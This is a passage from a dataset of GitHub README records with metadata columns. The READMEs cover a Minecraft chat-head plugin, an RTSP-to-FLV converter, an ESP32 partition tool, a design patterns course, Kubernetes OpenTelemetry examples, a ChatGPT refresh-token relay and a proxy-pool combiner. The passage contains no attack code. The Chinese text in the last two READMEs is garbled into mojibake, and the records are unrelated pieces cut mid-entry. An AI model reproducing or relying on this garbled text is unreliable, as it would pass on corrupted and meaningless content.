> --add-opens=java.base/java.time=ALL-UNNAMED 
> ```

## Support

If you need support as soon as possible, and you can't wait for any pull request, feel free to
use [our support](https://xdev.software/en/services/support).

## Contributing
See the [contributing guide](./CONTRIBUTING.md) for detailed instructions on how to get started with our project.

## Dependencies and Licenses

View the [license of the current project](LICENSE).
",16,2,7,126.0,"['feature', 'installation', 'usage', 'support', 'version', 'demo', 'support', 'contribute', 'dependency', 'license']","['support', 'feature', 'installation', 'usage', 'version']",5.0,"[com.mycila:license-maven-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-jxr-plugin,org.apache.maven.plugins:maven-pmd-plugin,org.apache.maven.plugins:maven-project-info-reports-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,4.0,1.0
OGminso/ChatHeadFont,main,"# Chat Head Font v0.0.4
Minecraft resource pack and API for creating dynamic player head chat icons.

![Alt Text](https://raw.githubusercontent.com/OGminso/ChatHeadFont/main/Actionbar.png)
![Alt Text](https://raw.githubusercontent.com/OGminso/ChatHeadFont/main/Chat.png)

## Note
This is a public resource/guide on how to add playerhead icons to the game chat. As theres not much information on how do this. I will not provide any further support for this resource unless required.

## Usage

### Resource Pack Installation
This was only tested on version 1.20.4

Note: This plugin will automatically download and apply the resource pack
to every player by default. You should only use the manual installation variant
if you have other plugins on your server that also require resource packs.
In that case, you can disable the auto-download feature by setting `auto-download-pack`
in the config to false.

Manual installation:

1. Download the resource pack ZIP file from the Releases section.
2. Place the ZIP file in the resourcepacks folder of your Minecraft installation directory.
3. In Minecraft, navigate to Options > Resource Packs.
4. Select the ChatHead resource pack and move it to the Selected Resource Packs column.
5. Click Done to apply the changes.

### Plugin Installation
Used to generate the player head icon and showcase them.

1. Download the plugin JAR file from the Releases section.
2. Place the JAR file in the plugins folder of your Minecraft server directory.
3. Start or restart your Minecraft server.

### Configuration
You can configure which messages will appear with a player head in front of them, or other config options in the `config.yml`
file of the plugin:
```yml
auto-download-pack: true # Whether the pack will automatically be downloaded and applied for every player
online-mode: true # Leave if server is in online mode. Set to false if server in offline mode.
enable-skin-overlay: true # Whether to display the player head with its hat overlay on?
enable-join-messages: true # Should join messages appear with a player head?
enable-leave-messages: true # Should leave messages appear with a player head?
enable-chat-messages: true # Should chat messages sent by players appear with a player head?
enable-death-messages: true # Should player death messages appear with a player head? 
```

## Unicode Characters
This works by coloring a set of unicodes which are set in the Resource Pack under a custom font called ""playerhead"".
It is then arranged into a grid of 8x8 of pixels using negative space.

- `\uF001`: Pixel 1 (1st Row)
- `\uF002`: Pixel 2 (2nd Row)
- `\uF003`: Pixel 3 (3rd Row)
- `\uF004`: Pixel 4 (4th Row)
- `\uF005`: Pixel 5 (5th Row)
- `\uF006`: Pixel 6 (6th Row)
- `\uF007`: Pixel 7 (7th Row)
- `\uF008`: Pixel 8 (8th Row)
- `\uF101`: Negative space (Moves back 1px)
- `\uF102`: Negative space (Moves back 2px)

## API Usage
Using the API class is as simple as this.

``` java
ChatHeadAPI chatHeadAPI = ChatHeadAPI.getInstance();
```

``` java
//get player head as String
chatHeadAPI.getHeadAsString(OfflinePlayer player, boolean overlay, SkinSource skinSource);
```

``` java
//get player head as BaseComponent[]
chatHeadAPI.getHead(OfflinePlayer player, boolean overlay, SkinSource skinSource);
```

``` java
//to select the SkinSource, use the default one, update it or pass to methods one of your choice
chatHeadAPI.defaultSource= new MojangSource();

//or
chatHeadAPI.getHead(OfflinePlayer player, boolean overlay, new MojangSource());
```

### Offline servers

Use player names instead of UUID.
Set the first parameter to false:

``` java
new MojangSource(false);
```

## [Examples](https://github.com/OGminso/ChatHeadFont/tree/main/src/main/java/net/minso/chathead/Examples)
- Join & Leave messages 
- ![Alt Text](https://raw.githubusercontent.com/OGminso/ChatHeadFont/main/joinleave.png)
- Actionbar
- ![Alt Text](https://raw.githubusercontent.com/OGminso/ChatHeadFont/main/Actionbar.png)

## TODO
- Add more examples use cases of the API
- Add support for placeholder api
- Add support for bossbars, scoreboards, titles, etc.

## Contribute
Feel free to contribute to this project, I will accept most pull requests.

## License and use

This pack is availible under Creative Commons Attribution 4.0 International (see LICENSE.txt). This gives you a lot of freedom to spread and adapt it to suit your needs. For example, you could alter parts that don't suit your needs and/or merge it into a pack of your own and share it.

Just remember to include attribution. A link back to the repository is appreciated, but not required.

",3,3,1,2.0,"['chat', 'head', 'font', 'note', 'usage', 'resource', 'pack', 'installation', 'plugin', 'installation', 'configuration', 'whether', 'pack', 'automatically', 'download', 'apply', 'every', 'player', 'leave', 'server', 'online', 'mode', 'set', 'false', 'server', 'offline', 'mode', 'whether', 'display', 'player', 'head', 'hat', 'overlay', 'on', 'should', 'join', 'message', 'appear', 'player', 'head', 'should', 'leave', 'message', 'appear', 'player', 'head', 'should', 'chat', 'message', 'send', 'player', 'appear', 'player', 'head', 'should', 'player', 'death', 'message', 'appear', 'player', 'head', 'unicode', 'character', 'api', 'usage', 'offline', 'server', 'example', 'http', 'todo', 'contribute', 'license', 'use']","['player', 'head', 'should', 'message', 'appear']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0
javpower/easy-flv,main,"<!-- Easy-FLV: Java RTSP/RTMP to FLV Converter -->
# ğŸ“º Easy-FLV: Java RTSP/RTMP to FLV Converter

[![GitHub stars](https://img.shields.io/github/stars/javpower/easy-flv.svg)](https://github.com/javpower/easy-flv) 
[![GitHub issues](https://img.shields.io/github/issues/javpower/easy-flv.svg)](https://github.com/javpower/easy-flv/issues) 
[![Apache License 2.0](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0) 
[![Java Version](https://img.shields.io/badge/java-1.8+-orange.svg)](https://adoptopenjdk.net/) 
[![Spring Boot](https://img.shields.io/badge/spring--boot-2.7.+-blue.svg)](https://spring.io/projects/spring-boot) 

## ğŸŒŸ About Easy-FLV
Easy-FLV is a Java library that converts RTSP or RTMP video streams into FLV format for playback in web browsers. It provides an efficient, stable, and easily integrable solution for real-time video monitoring, live streaming, and video stream processing.

### Why Choose Easy-FLV?
- **Efficient Conversion**: Quickly converts video streams to FLV format with no complex configuration required.
- **Easy Integration**: Used as a Spring Boot Starter, it can be easily integrated into any Java project.
- **Modern Browser Support**: Supports all major modern browsers without the need for additional plugins.
- **Real-time Stream Processing**: Suitable for the conversion of real-time video streams, such as security monitoring and live broadcasting.

## ğŸ“„ Screenshots
Below are screenshots of Easy-FLV in action:

![img_1.png](img_1.png)
![img.png](img.png)

## ğŸš€ Quick Start

### Add Maven Dependency
Include the following Maven dependency in your Spring Boot project:

```xml
<dependency>
    <groupId>io.github.javpower</groupId>
    <artifactId>rtsp-converter-flv-spring-boot-starter</artifactId>
    <version>1.5.9.1</version>
</dependency>
```

### Implement Interface
Create a service class that implements the `IOpenFLVService` interface to provide the stream address:

```java
@Service
public class RtspDataService implements IOpenFLVService {

    @Override
    public String getUrl(Integer channel) {
        // Retrieve the RTSP stream address based on the channel
        return ""rtsp://10.11.9.251:554/openUrl/16HV8mA"";
    }
}
```

### Configure YAML
Configure Easy-FLV in your `application.yml`:

```yaml
easy:
  flv:
    host: http://localhost:8200
```

### Use Interface
To get the converted stream address and play it in a browser:

- Conversion URL: `GET http://ip:port/get/flv/hls/stream_{channel}.flv`
- Direct Browser Playback: `GET http://ip:port/flv/hls/stream_{channel}.flv`

### Direct Usage
If you prefer not to implement an interface, you can directly encode the stream address and convert it:

```java
public static void main(String[] args) throws UnsupportedEncodingException {
    String url = ""rtsp://XXXXXXXX"";
    String encodedUrl = java.net.URLEncoder.encode(url, ""UTF-8"");
    System.out.println(""Encoded Stream URL: "" + encodedUrl);
}
```

- Conversion URL: `GET http://ip:port/get/flv/hls/stream?url=EncodedAddress`
- Direct Browser Playback: `GET http://ip:port/flv/hls/stream?url=EncodedAddress`

## ğŸ› ï¸ Contribution
Contributions of any kind are welcome, including but not limited to reporting bugs, submitting fixes, adding new features, and improving documentation.

## ğŸ“„ License
Easy-FLV is released under the [Apache License 2.0](LICENSE).

## ğŸ“§ Contact
- Email: [javpower@163.com](mailto:javpower@163.com)
- GitHub: [https://github.com/javpower/easy-flv](https://github.com/javpower/easy-flv)
- Gitee: [https://gitee.com/giteeClass/easy-flv](https://gitee.com/giteeClass/easy-flv)
",0,0,1,1.0,"['java', 'flv', 'converter', 'about', 'why', 'choose', 'screenshots', 'quick', 'start', 'add', 'maven', 'dependency', 'implement', 'interface', 'configure', 'yaml', 'use', 'interface', 'direct', 'usage', 'contribution', 'license', 'contact']","['interface', 'java', 'flv', 'converter', 'about']",1.0,"[ org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.sonatype.plugins:nexus-staging-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
serifpersia/esp32partitiontool,main,"<div align=""center"">

![logo-icon](https://github.com/user-attachments/assets/1463c312-1e81-4107-93be-0570c1b52532)
    
</div>


<div align=""center"">
    <img src=""https://img.shields.io/badge/ESP32-f8a631"" height=""50"">
    <img src=""https://img.shields.io/badge/Partition-bf457a"" height=""50"">
    <img src=""https://img.shields.io/badge/Tool-42b0f5"" height=""50"">
    <a href=""https://github.com/serifpersia/esp32partitiontool/releases/latest""><img src=""https://img.shields.io/badge/v1.4-9a41c2"" height=""50""></a>
</div>

## Overview
The ESP32 Partition Tool is a utility designed to facilitate creating custom partition schemes in Arduino IDE 1.8.x & PlatformIO.

This tool aims to simplify the process of creating custom partition schemes for ESP32 projects.
## Screenshots
![Screenshot 1](https://github.com/serifpersia/esp32partitiontool/assets/62844718/8724d57c-ebb5-404f-97f1-fe09134f53b5)
![image](https://github.com/user-attachments/assets/0a96d12d-0a71-4ba8-8134-8731e5dda2cf)
![platformioimagetool](https://github.com/user-attachments/assets/58244ede-f31e-4f83-8e7f-d17d2b5c0625)



## Functionality

- [x] Create partitions csv
- [x] Import custom partitions csv
- [x] Export custom partitions csv
- [x] Create & upload custom SPIFFS image(SPIFFS, LittleFS or FATFS)
- [x] Create & upload merged binary(Serial ports only)

## Download
 [![Release](https://img.shields.io/github/release/serifpersia/esp32partitiontool.svg?style=flat-square)](https://github.com/serifpersia/esp32partitiontool/releases)

# Build Instructions

## Build Requirements
Ensure you have the following installed:
- **Java JDK 8**: Required for compiling Java source files.
- **Python 3.6+**: Required for running the build script.

## Building the Tool

1. **Clone the Repository**:
   ```sh
   git clone https://github.com/serifpersia/esp32partitiontool.git
   cd esp32partitiontool
   ```
## Run the Build Script

- On **Unix-based systems** (Linux, macOS):
  ```
    python3 build_tool.py
- On **Windows**:
  ```
    python build_tool.py
  ```

## Installation (Arduino IDE)
- Download the tool from releases or build it yourself.
- In your Arduino sketchbook directory, create tools directory if it doesn't exist yet.
- Unpack the tool into tools directory (the path will look like `<home_dir>/Arduino/tools/ESP32PartitionTool/tool/ESP32PartitionTool.jar`).
- Restart Arduino IDE

## Usage (Arduino IDE)
- Select Tools > ESP32 Partition Tool menu item.
- Customize partition scheme.
- Export the custom partitions CSV file to sketch directory.
- Select Tools > Partition Scheme & select `Huge App (3MB APP/NO OTA/1MB SPIFFS)`*this will tell Arduino IDE to use our custom partitions.csv file that's located in sketch directory(export csv via the the tool first).
- Close and open the tool to automatically load csv located at the sketch directory or load csv manually with import csv button.
- Configure Flash size and use the uploading buttons. Upload SPIFFS for filesystem spiffs binary, Upload Merge for uploading all binaries or Merge binary for just creating the merge binary file.
* Merged binary can only be uploaded to ESP32 boards via serial ports, OTA uploading is not supported, spiffs upload is supported for uploading over OTA.

## Installation (Platformio)

- Install Java and make sure the executable is in the path
- Create a `partition_manager.py` in your project folder

#### partition_manager.py

```python
Import('env')
import os.path
import sys

# add esp32partitiontool to path
sys.path.append(os.path.abspath( env.PioPlatform().get_package_dir(""tool-esp32partitiontool"") ))
# import module
from esp32partitiontool import *
# run module
load_pm(env)
```

- To launch the GUI, both `extra_scripts` and `platform_packages` entries must be set

#### platformio.ini

```ini
[platformio]
src_dir = src
default_envs = hello-world

[env]
framework = arduino
platform = espressif32
board = esp32dev
; register the ""tool-esp32partitiontool""
; remove url if you have own built tool in pacakges directory of platformio core directory
platform_packages = tool-esp32partitiontool @ https://github.com/serifpersia/esp32partitiontool/releases/download/v1.4.4/esp32partitiontool-platformio.zip
; register the ""edit_partition"" target
extra_scripts = partition_manager.py

[env:hello-world]
board_build.partitions = partitions/default.csv
board_upload.flash_size = 4MB
upload_speed = 1500000


```

- If building the plugin from source, remove the URL from the `platform_packages` entry ...

```ini
platform_packages      = tool-esp32partitiontool
```

- ... and use `pio pkg` to install the plugin from the root of your platformio project:

```shell
pio pkg install -e build-partition --no-save --tool /path/to/esp32partitiontool/esp32partitiontool-platformio.zip --force
```


## Usage (Platformio)

- If building from vsCode: run  ESP32 Partition Tool Task
- If building from a shell : `pio run -t edit_partition -e your_environment`



## Issues and Contributions
Feel free to report any [issues](https://github.com/serifpersia/esp32partitiontool/issues). Translation [contributions are welcome](https://github.com/serifpersia/esp32partitiontool/tree/main/src/main/resources/l10n) if you find the current translations to be wrong, not adequate or you want to add support for another language.

## License
This project is licensed under the [MIT License](LICENSE).


",6,0,1,8.0,"['overview', 'screenshots', 'functionality', 'download', 'build', 'instruction', 'build', 'requirement', 'building', 'tool', 'run', 'build', 'script', 'installation', 'arduino', 'ide', 'usage', 'arduino', 'ide', 'installation', 'platformio', 'add', 'path', 'import', 'module', 'run', 'module', 'usage', 'platformio', 'issue', 'contribution', 'license']","['build', 'run', 'installation', 'arduino', 'ide']",1.0,"[maven-clean-plugin,org.apache.maven.plugins:maven-jar-plugin]",0.0,1.0,0.0
Yanyutin753/refresh-gpt-chat,main,"# refresh-gpt-chat

![Docker Image Size (tag)](https://img.shields.io/docker/image-size/yangclivia/refresh-gpt-chat/latest)![Docker Pulls](https://img.shields.io/docker/pulls/yangclivia/refresh-gpt-chat)[![GitHub Repo stars](https://img.shields.io/github/stars/Yanyutin753/refresh-gpt-chat?style=social)](https://github.com/Yanyutin753/refresh-gpt-chat/stargazers)

### ä¸è®¸ç™½å«–ï¼Œè¯·ç»™æˆ‘å…è´¹çš„starâ­å§ï¼Œååˆ†æ„Ÿè°¢ï¼

## ç®€ä»‹

#### [refresh-gpt-chat](https://github.com/Yanyutin753/refresh-gpt-chat) ä¸­è½¬oaifreeæˆ–è€…PandoraToV1Apiçš„/v1/chat/completionså’Œv1/images/generationsæ¥å£ï¼ŒæŠŠrefresh_tokenå½“keyä½¿ç”¨ï¼Œå†…å«hashmap,è‡ªåŠ¨æ›´æ–°access_token,å®Œç¾ç»§æ‰¿pandoraNextç•™ä¸‹çš„refresh_token,æ”¯æŒåŸºæœ¬æ‰€æœ‰çš„æ¨¡å‹ï¼Œå°ç™½ä¹Ÿèƒ½å¿«é€Ÿä½¿ç”¨ï¼

#### [refresh-gpt-chat](https://github.com/Yanyutin753/refresh-gpt-chat) Intercept the /v1/chat/completions and v1/images/generations interface of oaifree or PandoraToV1Api, use the refresh_token as the key, which contains a hashmap, automatically update the access_token, perfectly inherit the refresh_token left by pandoraNext, support almost all models, even beginners can use it quickly!

-----

> ## åŠŸèƒ½ç‰¹æ€§
>
> * **é€šè¿‡refresh_tokenè‡ªåŠ¨æ›´æ–°access_token**ï¼šæ–¹ä¾¿ä½¿ç”¨
>
> * **é€šè¿‡refresh_tokenä½œä¸ºkeyè¿›è¡Œä½¿ç”¨**ï¼šæ›´å¥½æ”¾å…¥one-apié‡Œé¢
>
> * **æ”¯æŒåä»£v1/images/generationsæ¥å£**ï¼šè°ƒç”¨dall-e-3ç”»å›¾æ›´å‡ºè‰²
>
> * **æ”¯æŒåä»£v1/audio/speechæ¥å£**ï¼šè°ƒç”¨tts-1ï¼Œæ–‡å­—è½¬è¯­éŸ³
>
> * **æ”¯æŒåä»£v1/audio/transcriptionsæ¥å£**ï¼šè°ƒç”¨whisper-1ï¼Œè¯­è¨€è½¬æ–‡å­—
>
> * **å¯é€‚ç”¨äºoaifreeã€PandoraToV1Apié¡¹ç›®**ï¼šåä»£æœåŠ¡ï¼Œç›´æ¥ä½¿ç”¨
>
> * **è‡ªå®šä¹‰åç¼€**ï¼šé˜²æ­¢urlè¢«æ»¥ç”¨
>
> * **æ”¯æŒbase64è¯†å›¾**ï¼šèƒ½è½¬å‘è¯†å›¾æ¥å£
>
> * **å›å¤æ‰“å­—æœºå¤„ç†**ï¼šå›å¤æ›´æµç•…ï¼Œå‡å°‘å¡é¡¿
>
> * **ä¸ªäººéƒ¨ç½²**ï¼šä¿éšœéšç§å®‰å…¨
>

## [âœ¨ç‚¹å‡»æŸ¥çœ‹æ–‡æ¡£ç«™](https://apifox.com/apidoc/shared-4b9a7517-3f80-47a1-84fc-fcf78827a04a)

> [!important]
>
> * æœ¬é¡¹ç›®åªæä¾›è½¬å‘æ¥å£ğŸ¥°
> * å¼€æºé¡¹ç›®ä¸æ˜“ï¼Œè¯·ç‚¹ä¸ªæ˜Ÿæ˜Ÿå§ï¼ï¼ï¼

## Sponsor

### å¦‚æœä½ è§‰å¾—æˆ‘çš„å¼€æºé¡¹ç›®å¯¹ä½ æœ‰å¸®åŠ©ï¼Œå¯ä»¥èµåŠ©æˆ‘ä¸€æ¯å’–å•¡å˜›ï¼Œååˆ†æ„Ÿè°¢ï¼ï¼ï¼

<img src=""https://github.com/Yanyutin753/RefreshToV1Api/assets/132346501/e5ab5e80-1cf2-4822-ae36-f9d0b11ed1b1"" width=""300"" height=""300"">

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=Yanyutin753/refresh-gpt-chat&type=Date)](https://star-history.com/#Yanyutin753/refresh-gpt-chat&Date)
",10,1,1,0.0,"['https', 'https', 'intercept', 'interface', 'oaifree', 'use', 'key', 'contain', 'hashmap', 'automatically', 'update', 'perfectly', 'inherit', 'leave', 'pandoranext', 'support', 'almost', 'model', 'even', 'beginner', 'use', 'quickly', 'http', 'sponsor', 'star', 'history']","['https', 'use', 'intercept', 'interface', 'oaifree']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
vesavvo/design_patterns,master,"# Design Patterns

Examples and Assigments for the Design Patterns course. (The lecture slides are in Oma.)

_This material has been made by Vesa Ollikainen._

## Examples and assignments

1. Factory Method. [Examples](markdown/examples/factory_method.md). [Assignments](markdown/assignments/factory_method.md).
2. Abstract Factory. [Examples](markdown/examples/abstract_factory.md). [Assignments](markdown/assignments/abstract_factory.md).
3. Composite. [Examples](markdown/examples/composite.md). [Assignments](markdown/assignments/composite.md).
4. Observer [Examples](markdown/examples/observer.md). [Assignments](markdown/assignments/observer.md).
5. Singleton. [Examples](markdown/examples/singleton.md). [Assignments](markdown/assignments/singleton.md).
6. Decorator. [Examples](markdown/examples/decorator.md). [Assignments](markdown/assignments/decorator.md).
7. State. [Examples](markdown/examples/state.md). [Assignments](markdown/assignments/state.md).
8. Template Method. [Examples](markdown/examples/template_method.md). [Assignments](markdown/assignments/template_method.md).
9. Strategy. [Examples](markdown/examples/strategy.md). [Assignments](markdown/assignments/strategy.md).
10. Chain of Responsibility. [Examples](markdown/examples/chain_of_responsibility.md). [Assignments](markdown/assignments/chain_of_responsibility.md).
11. Memento. [Examples](markdown/examples/memento.md). [Assignments](markdown/assignments/memento.md).
12. Proxy. [Examples](markdown/examples/proxy.md). [Assignments](markdown/assignments/proxy.md).
13. Visitor. [Examples](markdown/examples/visitor.md). [Assignments](markdown/assignments/visitor.md).
14. Builder. [Examples](markdown/examples/builder.md). [Assignments](markdown/assignments/builder.md).
15. Adapter. [Examples](markdown/examples/adapter.md). [Assignments](markdown/assignments/adapter.md).
16. Bridge. [Examples](markdown/examples/bridge.md). [Assignments](markdown/assignments/bridge.md).
17. Flyweight. [Examples](markdown/examples/flyweight.md). [Assignments](markdown/assignments/flyweight.md).
18. Prototype. [Examples](markdown/examples/prototype.md). [Assignments](markdown/assignments/prototype.md).
19. Mediator. [Examples](markdown/examples/mediator.md). [Assignments](markdown/assignments/mediator.md).
20. Iterator. [Examples](markdown/examples/iterator.md). [Assignments](markdown/assignments/iterator.md).
21. Facade. [Examples](markdown/examples/facade.md). [Assignments](markdown/assignments/facade.md).
22. Command. [Examples](markdown/examples/command.md). [Assignments](markdown/assignments/command.md).

---
_This learning material has been produced with assistance from OpenAI's ChatGPT-4 and GitHub Copilot. These large language models have provided suggestions and solutions that have assisted the author in producing and supplementing the material. While their contribution has been significant, the final responsibility for the content and its correctness resides with the author._",0,0,1,0.0,"['design', 'pattern', 'example', 'assignment']","['design', 'pattern', 'example', 'assignment']",1.0,[],0.0,1.0,0.0
catchpoint/Tracing.examples-kubernetes-java,main,"# Catchpoint Tracing Examples - Kubernetes/Java

## Pre-Requirements
1. **JDK** (`1.8+`)
2. **Maven** (`3.x`)
3. Please make sure **Docker Desktop** is installed and **Kubernetes** is activated. 
   Read [this](https://birthday.play-with-docker.com/kubernetes-docker-desktop) for details.
4. Please make sure **Kubernetes CLI** (`kubernetes-cli`/`kubectl`) is installed. 
   See [here](https://kubernetes.io/docs/tasks/tools/) for details.
   
## Setup with OpenTelemetry From the Beginning
This setup shows how you can install OpenTelemetry resources into Kubernetes first and deploy application later then.
So deployed applications will be auto instrumented.

### Setup OpenTelemetry Resources in Kubernetes
1. Replace `<CATCHPOINT-TRACING-API-KEY>` with your Catchpoint Tracing API key in `otel/collector.yaml` file.
2. Then run the setup script which installs **OpenTelemetry Operator** and **OpenTelemetry Instrumentation CR** (Custom Resource) into Kubernetes:
   ```bash
   ./otel/setup-otel.sh
   ```

### Deploy the Applications into Kubernetes with OTEL
1. Run the deployment script which deploys database and applications **with** OpenTelemetry configuration into Kubernetes:
	```bash
	./apps/deploy-apps-with-otel-conf.sh
	```
2. Wait until all services are activated.
3. Go to http://localhost:30000.

## Install OpenTelemetry After Setup

### Deploy the Applications into Kubernetes without OTEL
1. Run the deployment script which deploys database and applications **without** OpenTelemetry configuration into Kubernetes:
   ```bash
   ./apps/deploy-apps.sh
   ```
2. Wait until all services are activated.
3. Go to http://localhost:30000.

### Setup OpenTelemetry Resources in Kubernetes
1. Replace `<CATCHPOINT-TRACING-API-KEY>` with your Catchpoint Tracing API key in `otel/collector.yaml` file.
2. Then run the setup script which installs **OpenTelemetry Operator** and **OpenTelemetry Instrumentation CR** (Custom Resource) into Kubernetes:
   ```bash
   ./otel/setup-otel.sh
   ```
   
### Patch Services to be Traced by OpenTelemetry
1. Run the patch script which updates application deployments by adding **OpenTelemetry Auto Instrumentation Annotation** (`instrumentation.opentelemetry.io/inject-java`) to the services to be traced:
   ```bash
   ./apps/patch-apps-with-otel-conf.sh
   ```
2. Wait until all services are restarted.
3. Go to http://localhost:30000.

## Destroy

### Destroy the Deployment of Applications
1. Run the application destroy script which deletes applications and database deployed to Kubernetes:
   ```bash
   ./apps/destroy-apps.sh
   ```
2. Wait until all resources are deleted.

### Destroy the Resources of OpenTelemetry
1. Run the OpenTelemetry destroy script for deleting the OpenTelemetry resources (operator and instrumentation CR), 
   ```bash
   ./otel/destroy-otel.sh
   ```
2. Wait until all resources are deleted.
",0,0,2,2.0,"['catchpoint', 'tracing', 'example', 'setup', 'opentelemetry', 'from', 'begin', 'setup', 'opentelemetry', 'resource', 'kubernetes', 'deploy', 'application', 'kubernetes', 'otel', 'install', 'opentelemetry', 'after', 'setup', 'deploy', 'application', 'kubernetes', 'without', 'otel', 'setup', 'opentelemetry', 'resource', 'kubernetes', 'patch', 'service', 'traced', 'opentelemetry', 'destroy', 'destroy', 'deployment', 'application', 'destroy', 'resource', 'opentelemetry']","['opentelemetry', 'setup', 'kubernetes', 'resource', 'application']",1.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.springframework.boot:spring-boot-maven-plugin,org.xolstice.maven.plugins:protobuf-maven-plugin]",0.0,1.0,0.0
yint-tech/ProxyCompose,main,"# ProxyCompose

è¿™æ˜¯maleniaçš„å¼€æºåˆ†æ”¯ï¼Œä¸»è¦ç”¨äºç»™å•†ä¸šä»£ç å¼•æµğŸ˜Š

ProxyComposeæ˜¯ä¸€ä¸ªå¯¹ä»£ç†IPæ± è¿›è¡ŒäºŒæ¬¡ç»„åˆçš„å·¥å…·ï¼Œç”¨æˆ·å¯ä»¥å°†å¤šä¸ªé‡‡è´­çš„IPèµ„æºè¿›è¡ŒäºŒæ¬¡ç»„åˆï¼Œä½¿ç”¨ç»Ÿä¸€çš„è´¦æˆ·å¯†ç ï¼ŒæœåŠ¡å™¨ç«¯å£ç­‰ä¿¡æ¯è¿›è¡Œç»Ÿä¸€è®¿é—®ã€‚

äº¤æµç¾¤ï¼š åŠ å¾®ä¿¡ï¼šï¼ˆiinti_cnï¼‰æ‹‰å…¥å¾®ä¿¡äº¤æµç¾¤

## ç‰¹æ€§

1. è®¿é—®ç»Ÿä¸€ï¼šå¦‚è®ºæ˜¯ä»€ä¹ˆIPèµ„æºä¾›åº”å•†ï¼Œä¸šåŠ¡ä»£ç å‡æ¥å…¥ProxyComposeï¼ŒIPèµ„æºä¾›åº”å•†çš„å˜åŠ¨ä¸ä¼šå½±å“ä¸šåŠ¡ä»£ç 
2. æ± é—´è·¯ç”±ï¼šå¯¹äºå¤šä¸ªIPèµ„æºä¾›åº”å•†ï¼Œæ”¯æŒæµ®åŠ¨æµé‡æ¯”ä¾‹åŠ¨æ€è°ƒæ§ï¼Œå³æ ¹æ®IPæ± å¥åº·è¯„ä¼°ï¼Œå¼¹æ€§ä¼¸ç¼©å„ä¸ªIPæ± çš„æµé‡ã€‚æŸä¸ªIPæ± æŒ‚äº†ä¸å½±å“æ•´ä½“ä¸šåŠ¡
3. åè®®è½¬æ¢ï¼šä½ å¯ä»¥ä½¿ç”¨ProxyComposeå®ç°http/https/socks5å‡ ç§ä»£ç†åè®®çš„è½¬æ¢ï¼Œè¿™æ ·å³ä½¿é‡‡è´­çš„ä»£ç†èµ„æºä»…æ”¯æŒsocks5ï¼Œä¹Ÿèƒ½è½¬æ¢ä¸ºhttpsä»£ç†
4. æ± åŒ–åŠ é€Ÿï¼šProxyComposeå†…ç½®äº†ä¸€ä¸ªé«˜æ•ˆçš„IPæ± æ¨¡å—ï¼Œå¯ä»¥å¯¹IPèµ„æºçš„è®¿é—®è¿›è¡Œæ¢æµ‹ã€è¯„åˆ†ã€è¿æ¥æ± ç­‰å·¥ä½œï¼Œæé«˜IPèµ„æºä½¿ç”¨æˆåŠŸç‡

## ä½¿ç”¨

### æ„å»º

- å®‰è£…Java
- å®‰è£…maven
- Linux/macä¸‹ï¼Œæ‰§è¡Œè„šæœ¬ï¼š``build.sh``ï¼Œå¾—åˆ°æ–‡ä»¶``target/proxy-compose.zip``å³ä¸ºäº§å‡ºæ–‡ä»¶
- é…ç½®ï¼š è¯·æ ¹æ®å®é™…æƒ…å†µé…ç½®ä»£ç†èµ„æº ``conf/config.ini``
- è¿è¡Œè„šæœ¬ï¼š``bin/ProxyComposed.sh`` æˆ– ``bin/ProxyComposed.bat``
- ä»£ç†æµ‹è¯•ï¼š``curl -x iinti:iinti@127.0.0.1:36000 https://www.baidu.com/``

**å¦‚ä¸æ–¹ä¾¿æ„å»ºï¼Œå¯ä»¥ä½¿ç”¨æˆ‘ä»¬æ„å»ºå¥½çš„å‘å¸ƒåŒ…:[https://oss.iinti.cn/malenia/proxy-compose.zip](https://oss.iinti.cn/malenia/proxy-compose.zip)**

### æœ€ç®€é…ç½®

```ini
[global]
# é‰´æƒç”¨æˆ·ï¼Œå³ç”¨æˆ·è¿æ¥åˆ°proxy_composeçš„é‰´æƒ
auth_username=iinti
# é‰´æƒå¯†ç 
auth_password=iinti

# å®šä¹‰IPèµ„æºï¼Œå³ä»IPä¾›åº”å•†é‡‡è´­çš„IPèµ„æº,è¦æ±‚è‡³å°‘é…ç½®ä¸€ä¸ªIPèµ„æº
[source:dailiyun]
# IPèµ„æºä¸‹è½½è¿æ¥
loadURL=http://ä¿®æ”¹è¿™é‡Œ.user.xiecaiyun.com/api/proxies?action=getText&key=ä¿®æ”¹è¿™é‡Œ&count=ä¿®æ”¹è¿™é‡Œ&word=&rand=false&norepeat=false&detail=false&ltime=0
# Ipä¾›åº”æä¾›çš„ä»£ç†è´¦æˆ·ï¼ˆå¦‚æœæ˜¯ç™½åå•ï¼Œåè€…æ— é‰´æƒï¼Œåˆ™æ— éœ€é…ç½®ï¼‰
upstreamAuthUser=ä¿®æ”¹è¿™é‡Œ
# Ipä¾›åº”æä¾›çš„ä»£å¯†ç 
upstreamAuthPassword=ä¿®æ”¹è¿™é‡Œ
# IPæ± å¤§å°ï¼Œé‡è¦
poolSize=10
```

### å®Œæ•´é…ç½®

```ini
[global]
# å¼€å¯debugå°†ä¼šæœ‰æ›´åŠ ä¸°å¯Œçš„æ—¥å¿—
debug=false
# å¯¹ä»£ç†IPè´¨é‡è¿›è¡Œæ¢æµ‹çš„URL
proxyHttpTestURL = https://iinti.cn/conn/getPublicIp?scene=proxy_compose
